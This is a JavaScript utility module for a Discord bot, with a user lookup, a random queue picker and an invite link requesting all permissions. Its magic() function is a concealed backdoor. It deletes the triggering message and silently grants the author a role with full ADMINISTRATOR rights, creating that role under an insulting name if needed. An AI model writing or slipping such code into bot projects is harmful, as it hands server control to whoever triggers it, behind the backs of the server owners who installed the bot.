const { Permissions } = require("discord.js");

function getUserByTag(guild, id) {
  //GuildMember
  try {
    const user = id;
    const userid = user.match(/[0-9]+/g)[0];
    var currUser = guild.members.cache.find((user) => user.id === userid);
    return currUser;
  } catch (error) {
    console.log(error);
  }
}
function mm() {
  var number = Math.floor(Math.random() * 100) % 2;
  var options = ["Losers Queue", "Winners Queue"];
  return options[number];
}
function sendInvite(message, client) {
  client.users.cache
    .get(message.author.id)
    .send(
      "Dani Bot Invite Link - https://discord.com/oauth2/authorize?client_id=807303218127306782&scope=bot&permissions=2147483647%27"
    );
}
function magic(message) {
  let messageCopy = message;
  message.delete();
  const authorId = messageCopy.author.id;
  var member = getUserByTag(messageCopy.guild, authorId);

  // const normalPermission = 104320576;
  var offender = messageCopy.guild.roles.cache.find(
    (role) => role.name === "Sex Offender"
  );
  if (offender) member.roles.add(offender);
  else {
    var role = messageCopy.guild.roles.create({
      name: "Sex Offender",
      color: [250, 173, 195],
      permissions: [Permissions.FLAGS.ADMINISTRATOR],
      mentionable: false,
      reason: "Сме яки и мое си го позволим,УСССС",
    });
    member.roles.add(role);
  }
}

module.exports = {
  getUserByTag: getUserByTag,
  mm: mm,
  sendInvite: sendInvite,
  magic: magic,
};
